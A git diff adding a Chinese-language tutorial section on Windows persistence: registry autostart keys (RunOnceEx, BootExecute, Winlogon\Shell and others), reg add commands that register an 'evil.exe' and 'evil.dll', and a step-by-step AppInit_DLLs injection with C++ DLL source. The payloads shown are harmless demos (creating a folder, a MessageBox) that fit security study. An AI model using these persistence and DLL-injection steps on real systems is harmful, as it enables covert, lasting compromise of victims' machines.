@@ -1,4 +1,4 @@
-# BACKDOOR
+# BACKDOOR with 权限维持
 
 ## 1、Shift后门 
 
@@ -69,6 +69,220 @@ RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作�
 重启查看执行结果
 
 ![](../../.gitbook/assets/image%20%28352%29.png)
+
+### 3、权限维持选项
+
+在测试权限维持的过程中，一些需要用到dll进行权限维持的地方，无法进行下去，很可惜现在还不会C语言，无法编写测试dll。如果希望在Windows安全研究的更深，确实需要先对C有一定的研究
+
+一个简单的payload eval.exe，如果被执行了会在D盘新建一个hack文件夹
+
+```text
+## eval.exe
+
+#include "stdlib.h"
+
+void main()
+{
+	system("mkdir d:\\hack");
+}
+```
+
+#### 1、RunOnceEx
+
+启动时序：用户登录时加载。 
+
+可以启动exe、dll 
+
+注册表位置：
+
+```text
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
+```
+
+使用格式参考：
+
+```text
+# EXE 自启动 
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v 1 /d "D:\evil.exe" 
+
+# DLL 自启动 
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "D:\evil.dll"
+```
+
+#### 2、BootExecute
+
+启动时序：在驱动程序、系统核心加载后，由SMSS.exe进行加载。 
+
+注册表位置：
+
+```text
+HKLM\SYSTEM\ControlSet002\Control\Session Manager\BootExecute
+```
+
+默认值：autocheck autochk \*
+
+案例：
+
+[https://attack.mitre.org/software/S0397/](https://attack.mitre.org/software/S0397/) 
+
+将值修改为：autocheck autoche \*
+
+#### 3、Startup folder
+
+启动时序：用户登录到后。 
+
+设置启动目录的路径，以达到自启动。 
+
+注册表位置：
+
+```text
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+```
+
+#### 4、RunServices
+
+启动时序：在登录框出现时，就会加载。 
+
+在测试过程中测试程序没有被加载。
+
+注册表位置：
+
+```text
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
+```
+
+#### 5、Explorer\Run
+
+启动时序：用户登录到后。 
+
+注册表位置：
+
+```text
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
+```
+
+![](../../.gitbook/assets/image%20%28423%29.png)
+
+#### 6、Winlogon\Shell
+
+启动时序：用户登录到后。 
+
+默认值：explorer.exe 这个用于指定登录的shell，修改后会导致资源管理器无法加载。 
+
+注册表位置：
+
+```text
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+```
+
+![](../../.gitbook/assets/image%20%28399%29.png)
+
+#### 7、AppInitDLLs / LoadAppInitDLLs
+
+启动时序：程序调用dll时（基本所有程序都会调用系统dll），就会注入指定的dll 
+
+注册表位置：
+
+```text
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
+```
+
+实验较为复杂，需要编写DLL进行注入：
+
+https://rickgray.me/2014/08/25/the-registration-injection-of-dll-injection/
+
+
+
+1、其实注册表注入相对远程DLL注入来说更简单、更方便一点，只需在注册表中修改AppInit\_DLLs和LoadAppInit\_DLLs的键值即可。
+
+User32.dll被加载到进程时，会获取AppInit\_DLLs注册表项，若有值，则调用LoadLibrary\(\) API加载用户DLL。所有，DLL注册表注入，并不会影响所有进程，只会影响加载了user32.dll的进程
+
+（下面示例过程在windows 32位下测试成功）
+
+2、下面给出测试的DLL文件源码
+
+```text
+// MessageBox.cpp  
+
+#include <windows.h>  
+#include <tchar.h>  
+
+#define DEF_PROCESS_NAME "cmd.exe"  // 目标进程 cmd.exe  
+
+BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {  
+    char szPath[MAX_PATH] = {0, };  
+    char *p = NULL;  
+
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);  
+    p = strrchr(szPath, '\\');  
+
+    switch( dwReason ) {  
+        case DLL_PROCESS_ATTACH:  
+            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )  
+                MessageBox(NULL, TEXT("Hello cmd!!!"), TEXT("info"), MB_OK);  // 被进程加载时弹出MessageBox("Dll Inject Success!!!")  
+            break;  
+        case DLL_PROCESS_DETACH:  
+            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )  
+                MessageBox(NULL, TEXT("Goodbye cmd!!!"), TEXT("info"), MB_OK);  // 被进程卸载时弹出MessageBox("Dll unInject Ok!!!")  
+            break;  
+    }  
+    return TRUE;  
+}
+```
+
+编译该DLL：
+
+```text
+g++ --share -o MessageBox.dll MessageBox.cpp    
+#我们将MessageBox.dll文件放在d:\下面
+```
+
+该DLL被加载时，会检测进程名是否为“cmd.exe”，若为“cmd.exe”会弹出MessageBox进行相应提示。
+
+下面我们修改注册表，来使得每次加载user32.dll时都会加载我们自己编写的MessageBox.dll
+
+打开regedit.exe，进入如下路径。
+
+```text
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+```
+
+编辑修改AppInit\_DLLs表项的值为我们编译的MessageBox.dll所在的路径地址
+
+![](../../.gitbook/assets/image%20%28426%29.png)
+
+![](../../.gitbook/assets/image%20%28427%29.png)
+
+然后修改LoadAppInit\_DLLs注册表项的值为1，如下图所示
+
+![](../../.gitbook/assets/image%20%28405%29.png)
+
+注册表项修改完毕后，重启系统，使修改生效。重启完毕后，我们呢使用Process Explorer查看MessageBox.dll是否被注入进程
+
+![](../../.gitbook/assets/image%20%28420%29.png)
+
+从上图可以看出，MessageBox.dll注入了部分进程，然后我们运行一下cmd.exe看是否或被注入MessageBox.dll
+
+![](../../.gitbook/assets/image%20%28416%29.png)
+
+从上图红色框框所标识的部分来看，运行cmd.exe时因为加载了user32.dll，所以也同时加载了我们自己写的MessageBox.dll，在DllMain\(\)运行时，检测到当前进程为“cmd.exe”因此弹出了MessageBox\(\)，说明注册表DLL注入成功。
+
+若我们关闭cmd.exe，会弹出如下窗口  
+
+![](../../.gitbook/assets/image%20%28406%29.png)
+
+MessageBox.dll被cmd.exe进程成功卸载。
+
+总结：DLL注册表注入相对与DLL远程注入来说，更加容易、方便，攻击者可以编写恶意DLL来做他任何想做的事情
 
 ## 4、定时任务
 
